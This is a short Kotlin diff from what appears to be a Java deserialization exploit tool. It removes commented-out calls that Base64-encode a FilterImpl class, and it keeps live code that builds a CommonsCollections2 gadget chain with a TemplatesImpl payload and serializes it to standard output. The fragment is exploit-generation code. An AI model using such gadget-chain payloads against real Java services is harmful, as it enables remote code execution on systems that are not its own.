@@ -8,11 +8,6 @@ fun main(args: Array<String>) {
     // exploit(CommonsCollections2ObjectPayload, TemplatesImplPayload1::class.java)
     // exploit(CommonsCollections2ObjectPayload, TemplatesImplPayload2::class.java)
 
-    // exploit(clazz<FilterImpl>().asBase64(true))
-    // exploit(clazz<FilterImpl>().asBase64(true))
-
-    // println(clazz<FilterImpl>().asBase64(true))
-
     CommonsCollections2ObjectPayload
         .getObject(TemplatesImplPayload1::class.java)
         .serialize(System.out)
